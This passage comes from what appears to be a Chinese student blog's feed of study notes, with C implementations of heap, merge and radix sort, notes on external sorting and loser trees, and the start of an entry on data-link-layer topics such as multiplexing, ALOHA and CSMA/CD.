若满⾜：L(i)≥L(2i)且L(i)≥L(2i+1) （1 ≤ i ≤n/2 ）—— ⼤根堆（⼤顶堆）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp; ② 若满⾜：L(i)≤L(2i)且L(i)≤L(2i+1) （1 ≤ i ≤n/2 ）—— ⼩根堆（⼩顶堆）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/16.png" style="zoom:80%;" /></center><ul><li><h6 id="建立大根堆实现代码"><a href="#建立大根堆实现代码" class="headerlink" title="建立大根堆实现代码"></a>建立大根堆实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//建立大根堆</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BuildMaxHeap</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=len/<span class="hljs-number">2</span>;i&gt;<span class="hljs-number">0</span>;i--)    <span class="hljs-comment">//从后往前调整所有非终端结点</span><br>        HeadAdjust(A,i,len);<br>&#125;<br><br><span class="hljs-comment">//将 以k为根的子树调整为大根堆</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">HeadAdjust</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> len)</span><br>&#123;<br>    A[<span class="hljs-number">0</span>]=A[k];      <span class="hljs-comment">//A[0]暂存子树的根节点</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>*k;i&lt;=len;i*=<span class="hljs-number">2</span>)   <span class="hljs-comment">//沿key较大的子结点向下筛选</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(i&lt;len&amp;&amp;A[i]&lt;A[i+<span class="hljs-number">1</span>])<br>            i++;             <span class="hljs-comment">//取key更大的子结点下标</span><br>        <span class="hljs-keyword">if</span>(A[<span class="hljs-number">0</span>]&gt;=A[i])      <span class="hljs-comment">//筛选结束</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            A[k]=A[i];     <span class="hljs-comment">//将A[i]调整到双亲结点上</span><br>            k=i;         <span class="hljs-comment">//修改k值，以便继续向下筛选</span><br>        &#125;<br>    &#125;<br>    A[k]=A[<span class="hljs-number">0</span>];           <span class="hljs-comment">//被筛选结点的值放入最终位置</span><br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/17.png" style="zoom:60%;" /></center><ul><li><h6 id="基于大根堆的排序代码实现"><a href="#基于大根堆的排序代码实现" class="headerlink" title="基于大根堆的排序代码实现"></a>基于大根堆的排序代码实现</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//建立大根堆</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BuildMaxHeap</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> len)</span><br>    <br><span class="hljs-comment">//将 以k为根的子树调整为大根堆</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">HeadAdjust</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> len)</span><br><br><span class="hljs-comment">//堆排序的完全逻辑</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">HeapSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> len)</span><br>&#123;<br>    BuildMaxHeap(A,len);    <span class="hljs-comment">//初始建堆</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=len;i&gt;<span class="hljs-number">1</span>;i--)   <span class="hljs-comment">//n-1趟的交换和建堆过程</span><br>    &#123;   <br>        swap(A[i],A[<span class="hljs-number">1</span>]);     <span class="hljs-comment">//堆顶元素和堆底元素交换</span><br>        HeadAdjust(A,<span class="hljs-number">1</span>,i<span class="hljs-number">-1</span>);   <span class="hljs-comment">//把剩余的待排序元素整理成堆</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-5"><a href="#算法效率分析-5" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/18.png" style="zoom:100%;" /></center><ul><li><h6 id="堆的插入"><a href="#堆的插入" class="headerlink" title="堆的插入"></a>堆的插入</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/19.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/20.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/21.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/22.png" style="zoom:80%;" /></center><ul><li><h6 id="堆的删除"><a href="#堆的删除" class="headerlink" title="堆的删除"></a>堆的删除</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/23.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/24.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/25.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/26.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-归并排序"><a href="#8-归并排序" class="headerlink" title="8.归并排序"></a>8.归并排序</h4><ul><li><h6 id="算法思想-5"><a href="#算法思想-5" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;归并：把两个或者多个已经有序的序列合并成一个</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/27.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/28.png" style="zoom:80%;" /></center><ul><li><h6 id="实现代码-4"><a href="#实现代码-4" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *B=(<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(n*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));  <span class="hljs-comment">//辅助数组B</span><br><br><span class="hljs-comment">//A[low...mid]和A[mid+1...high]各自有序，将两个部分归并</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Merge</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> mid,<span class="hljs-type">int</span> high)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,k;<br>    <span class="hljs-keyword">for</span>(k=low;k&lt;=high;k++)<br>        B[k]=A[k];       <span class="hljs-comment">//将A中的所有元素复制到B中</span><br>    <span class="hljs-keyword">for</span>(i=low,j=mid+<span class="hljs-number">1</span>,k=i;i&lt;=mid&amp;&amp;j&lt;=high;k++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(B[i]&lt;=B[j])<br>            A[k]=B[i++];       <span class="hljs-comment">//将较小的值复制到A中</span><br>        <span class="hljs-keyword">else</span><br>            A[k]=B[j++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid)<br>        A[k++]=B[i++];<br>    <span class="hljs-keyword">while</span>(j&lt;=high)<br>        A[k++]=B[j++];   <br>&#125;<br><br><span class="hljs-comment">//归并排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MergeSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)<br>    &#123;<br>        <span class="hljs-type">int</span> mid=(low+high)/<span class="hljs-number">2</span>;  <span class="hljs-comment">//从中间划分</span><br>        MergeSort(A,low,mid);   <span class="hljs-comment">//对左半部分归并排序</span><br>        MergeSort(A,mid+<span class="hljs-number">1</span>,high);   <span class="hljs-comment">//对右半部分归并排序</span><br>        Merge(A,low,mid,high);   <span class="hljs-comment">//归并</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-6"><a href="#算法效率分析-6" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/29.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="9-基数排序"><a href="#9-基数排序" class="headerlink" title="9.基数排序"></a>9.基数排序</h4><ul><li><h6 id="算法思想-6"><a href="#算法思想-6" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;假设长度为n的线性表中每个结点aj的关键字由d元组组成，其中：</p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;0≤kij≤r-1(0≤j＜n，0≤i≤d-1)，r称为“基数”</p> <center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/36.png" style="zoom:80%;" /></center><ul><li><h6 id="实现举例"><a href="#实现举例" class="headerlink" title="实现举例"></a>实现举例</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/30.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/31.png" style="zoom:75%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/32.png" style="zoom:90%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/33.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/34.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/35.png" style="zoom:80%;" /></center><ul><li><h6 id="实现代码-5"><a href="#实现代码-5" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;LinkNode,*LinkList;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>   //链式队列</span><br><span class="hljs-class">&#123;</span><br>    LinkNode *front,*rear;   <span class="hljs-comment">//队列的队头和队尾指针</span><br>&#125;LinkQueue;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-7"><a href="#算法效率分析-7" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/37.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="10-外部排序"><a href="#10-外部排序" class="headerlink" title="10.外部排序"></a>10.外部排序</h4><ul><li><h6 id="外部排序流程举例"><a href="#外部排序流程举例" class="headerlink" title="外部排序流程举例"></a>外部排序流程举例</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/38.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/39.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/40.png" style="zoom:80%;" /></center><ul><li><h6 id="优化方法一——多路归并"><a href="#优化方法一——多路归并" class="headerlink" title="优化方法一——多路归并"></a>优化方法一——多路归并</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/41.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/42.png" style="zoom:80%;" /></center><ul><li><h6 id="优化方法二——减少初始归并段数量"><a href="#优化方法二——减少初始归并段数量" class="headerlink" title="优化方法二——减少初始归并段数量"></a>优化方法二——减少初始归并段数量</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/43.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/44.png" style="zoom:80%;" /></center><ul><li><h6 id="多路平衡归并"><a href="#多路平衡归并" class="headerlink" title="多路平衡归并"></a>多路平衡归并</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/45.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="11-败者树"><a href="#11-败者树" class="headerlink" title="11.败者树"></a>11.败者树</h4><ul><li><h6 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h6></li></ul><p>&emsp;&emsp;败者树是指可以视为一棵完全二叉树（多了一个头头）。k个叶节点分别是当前参加比较的元素，非叶子结点用来记忆左右子树的”失败者”，而让胜者往上继续进行比较，一直到根节点（考的频率不高，基本是手算的程度）</p><ul><li><h6 id="在多路平衡归并的应用"><a href="#在多路平衡归并的应用" class="headerlink" title="在多路平衡归并的应用"></a>在多路平衡归并的应用</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/46.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/47.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/48.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="12-置换—选择排序"><a href="#12-置换—选择排序" class="headerlink" title="12.置换—选择排序"></a>12.置换—选择排序</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/49.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/50.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/51.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/52.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="13-最佳归并树"><a href="#13-最佳归并树" class="headerlink" title="13.最佳归并树"></a>13.最佳归并树</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/53.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/54.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/55.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>数据结构学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据链路层（中）</title>
    <link href="/2022/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/"/>
    <url>/2022/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="数据链路层（中）"><a href="#数据链路层（中）" class="headerlink" title="数据链路层（中）"></a>数据链路层（中）</h1><h4 id="1-数据传输使用的两种链路"><a href="#1-数据传输使用的两种链路" class="headerlink" title="1.数据传输使用的两种链路"></a>1.数据传输使用的两种链路</h4><ul><li><h6 id="点对点链路"><a href="#点对点链路" class="headerlink" title="点对点链路"></a>点对点链路</h6></li></ul><p>&emsp;&emsp;两个相邻结点通过一个链路相连，没有第三者。应用：PPP协议，常用于广域网</p><ul><li><h6 id="广播式链路"><a href="#广播式链路" class="headerlink" title="广播式链路"></a>广播式链路</h6></li></ul><p>&emsp;&emsp;所有主机共享通信介质。应用：早期的总线以太网、无线局域网，常用于局域网。典型拓扑结构：总线型、星型（逻辑总线型）</p><h4 id="2-介质访问控制"><a href="#2-介质访问控制" class="headerlink" title="2.介质访问控制"></a>2.介质访问控制</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/1.png" style="zoom:80%;" /></center>&emsp;&emsp;介质访问控制的内容就是，采取一定的措施，使得两对节点之间的通信不会发生相互干扰的情况<p>&emsp;</p><h4 id="3-信道划分介质访问控制"><a href="#3-信道划分介质访问控制" class="headerlink" title="3.信道划分介质访问控制"></a>3.信道划分介质访问控制</h4><p>&emsp;&emsp;信道划分介质访问控制：将使用介质的每个设备与来自(o´ω`o同一信道上的其他设备的通信隔离开，把时域和频域资源合理地分配给网络上的设备</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/4.png" style="zoom:80%;" /></center><ul><li><h6 id="频分多路复用（FDM）"><a href="#频分多路复用（FDM）" class="headerlink" title="频分多路复用（FDM）"></a>频分多路复用（FDM）</h6></li></ul><p>&emsp;&emsp;用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。频分复用的所有用户在同样的时间占用不同的带宽（频率带宽）资源</p><p>&emsp;&emsp;充分利用传输介质带宽，系统效率较高；由于技术比较成熟，实现也比较容易</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/5.png" style="zoom:80%;" /></center><ul><li><h6 id="时分多路复用（TDM）"><a href="#时分多路复用（TDM）" class="headerlink" title="时分多路复用（TDM）"></a>时分多路复用（TDM）</h6></li></ul><p>&emsp;&emsp;将时间划分为一段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙，所有用户轮流占用信道</p><p>&emsp;&emsp;TDM帧是在物理层传送的比特流所划分的帧，标准一个周期</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/6.png" style="zoom:80%;" /></center><ul><li><h6 id="统计时分复用（STDM）"><a href="#统计时分复用（STDM）" class="headerlink" title="统计时分复用（STDM）"></a>统计时分复用（STDM）</h6></li></ul><p>&emsp;&emsp;统计时分复用是根据时分复用进行改良，由集中器统计统计然后在一条信道进行发送</p><p>&emsp;&emsp;每一个STDM帧中的时隙数小于连接在集中器上的用户数。各用户有了数据就随时发往集中器的输入缓存中，然后集中器按顺序依次扫描输入缓存，把缓存的输入数据放入STDM帧中，一个STDM帧满了就发出。STDM帧不是固定分配时隙，二十按需动态分配时隙</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/7.png" style="zoom:80%;" /></center><ul><li><h6 id="波分多路复用（WDM）"><a href="#波分多路复用（WDM）" class="headerlink" title="波分多路复用（WDM）"></a>波分多路复用（WDM）</h6></li></ul><p>&emsp;&emsp;波分多路复用就是光的频分多里复用，在一根光纤中传输多种不同波长（频率）的光信号，由于波长（频率）不同，所以各路光信号互不干扰，最后再用波长分解复用器将各路波长分解出来</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/8.png" style="zoom:80%;" /></center><ul><li><h6 id="码分多路复用（CDM）"><a href="#码分多路复用（CDM）" class="headerlink" title="码分多路复用（CDM）"></a>码分多路复用（CDM）</h6></li></ul><p>&emsp;&emsp;1个比特分为多个码片/芯片，每一个站点被指定一个唯一的m位的芯片序列，发送1时发送芯片序列（通常把0写成-1），发送1时站点发送芯片序列，发送0时发送芯片序列反码</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/9.png" style="zoom:50%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-ALOHA协议"><a href="#4-ALOHA协议" class="headerlink" title="4.ALOHA协议"></a>4.ALOHA协议</h4><ul><li><h6 id="纯ALOHA协议"><a href="#纯ALOHA协议" class="headerlink" title="纯ALOHA协议"></a>纯ALOHA协议</h6></li></ul><p>&emsp;&emsp;纯ALOHA协议思想：不监听信道，不按时间槽发送，随机重发，想发就发</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/2.png" style="zoom:80%;" /></center><ul><li><h6 id="时隙ALOHA协议"><a href="#时隙ALOHA协议" class="headerlink" title="时隙ALOHA协议"></a>时隙ALOHA协议</h6></li></ul><p>&emsp;&emsp;时隙ALOHA协议的思想：把时间分为若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发生冲突，则必须等到下一个时间片开始时刻再发送</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/3.png" style="zoom:80%;" /></center><ul><li><h6 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h6></li></ul><p>&emsp;&emsp;纯ALOHA比时隙ALOHA吞吐量更低，效率更低</p><p>&emsp;&emsp;纯ALOHA想发就发，间隙ALOHA只有在时间片段开始时才能发</p><p>&emsp;</p><h4 id="5-CSMA协议"><a href="#5-CSMA协议" class="headerlink" title="5.CSMA协议"></a>5.CSMA协议</h4><p>&emsp;&emsp;CS：载波侦听/监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据</p><p>&emsp;&emsp;当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大（互相叠加）。当一个站检测到的信号 电压摆动值超过一定门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞，即发生了冲突。（了解即可）</p><p>&emsp;&emsp;MA：多点接入，表示许多计算机以多点接入的方式连接在一根总线上</p><ul><li><h6 id="协议思想"><a href="#协议思想" class="headerlink" title="协议思想"></a>协议思想</h6></li></ul><p>&emsp;&emsp;发送帧之前，监听信道</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/11.png" style="zoom:80%;" /></center><ul><li><h6 id="1—坚持CSMA"><a href="#1—坚持CSMA" class="headerlink" title="1—坚持CSMA"></a>1—坚持CSMA</h6></li></ul><p>&emsp;&emsp;坚持指的是对监听信道忙之后的坚持，其中心思想是：</p><p>&emsp;&emsp;如果一个主机要发送消息，那么它先监听信道。空闲则直接传输，不必等待，忙则一直监听，直到空闲马上传输，如果有冲突（一段时间内未收到肯定回复）则等待一个随机长的时间再监听，重复上述过程</p><p>&emsp;&emsp;优点：只要媒体空闲，站点就马上发送，避免了媒体利用率的损失</p><p>&emsp;&emsp;缺点：假如有两个或两个以上的站点有数据要发送，冲突就不可避免</p><ul><li><h6 id="非坚持CSMA"><a href="#非坚持CSMA" class="headerlink" title="非坚持CSMA"></a>非坚持CSMA</h6></li></ul><p>&emsp;&emsp;非坚持指的是对于监听信道忙后就不继续监听，其中心思想是：</p><p>&emsp;&emsp;如果一个主机要发送消息，那么它先监听信道，空闲则之间传输，不必等待，忙则等待一个随机的时间之后再进行监听</p><p>&emsp;&emsp;优点：采用随机的重发延迟时间可以减少冲突发生的可能性</p><p>&emsp;&emsp;缺点：可能存在大家都在延迟等待过程中，使得媒体仍可能处于空闲状态，媒体使用效率降低</p><ul><li><h6 id="p—坚持CSMA"><a href="#p—坚持CSMA" class="headerlink" title="p—坚持CSMA"></a>p—坚持CSMA</h6></li></ul><p>&emsp;&emsp;p—坚持指的是对于监听信道空闲的处理，其中心思想是：</p><p>&emsp;&emsp;如果一个主机要发送消息，那么它先监听信道。空闲则以p概率直接传输，不必等待；概率1-p等待到下一个时间槽在传输。忙则持续监听知道信道空闲再以p概率发送。若冲突则等到下一个时间槽开始再监听并重复上述过程</p><p>&emsp;&emsp;优点：既能像非坚持算法那样减少冲突，有能像1—坚持算法那样减少媒体空闲时间的这种方案</p><p>&emsp;&emsp;缺点：发生冲突后还要坚持吧数据帧发送完，造成了浪费</p><ul><li><h6 id="三种CSMA对比"><a href="#三种CSMA对比" class="headerlink" title="三种CSMA对比"></a>三种CSMA对比</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/12.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-CSMA-CD协议"><a href="#6-CSMA-CD协议" class="headerlink" title="6.CSMA/CD协议"></a>6.CSMA/CD协议</h4><p>&emsp;&emsp;CS：载波侦听/监听，每一个站在发送数据之前以及发送数据时都要检测一下总线上是否有其他计算机在发送数据</p><p>&emsp;&emsp;MA：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。总线型网络</p><p>&emsp;&emsp;CD：碰撞检测（冲突检测），“边发送边监听”，适配器边发送数据边检测信道上信号电压的变化情况，以便判 断自己在发送数据时其他站是否也在发送数据 。半双工网络</p><ul><li><h6 id="传播时延对载波监听的影响"><a href="#传播时延对载波监听的影响" class="headerlink" title="传播时延对载波监听的影响"></a>传播时延对载波监听的影响</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/13.png" style="zoom:80%;" /></center><ul><li><h6 id="碰撞后的重传算法"><a href="#碰撞后的重传算法" class="headerlink" title="碰撞后的重传算法"></a>碰撞后的重传算法</h6></li></ul><p>&emsp;&emsp;在这种协议中，当确定碰撞后的重传时间采用的是截断二进制指数规避算法：</p><p>&emsp;&emsp;1、确定基本退避（推迟）时间为争用期 2τ。</p><p>&emsp;&emsp;2、定义参数k，它等于重传次数，但k不超过10，即k=min[重传次数，10]。当重传次数不超过10时，k等于 重传次数；当重传次数大于10时，k就不再增大而一直等于10。</p><p>&emsp;&emsp; 3、从离散的整数集合[0, 1, , 2^k -1]中随机取出一个数r，重传所需要退避的时间就是r倍的基本退避时间，即 2rτ 。</p><p>&emsp;&emsp;4、当重传达16次仍不能成功时，说明网络太拥挤，认为此帧永远无法正确发出，抛弃此帧并向高层报告出错。 </p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/14.png" style="zoom:80%;" /></center><ul><li><h6 id="最小帧长问题"><a href="#最小帧长问题" class="headerlink" title="最小帧长问题"></a>最小帧长问题</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94/15.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-CSMA-CA协议"><a href="#7-CSMA-CA协议" class="headerlink" 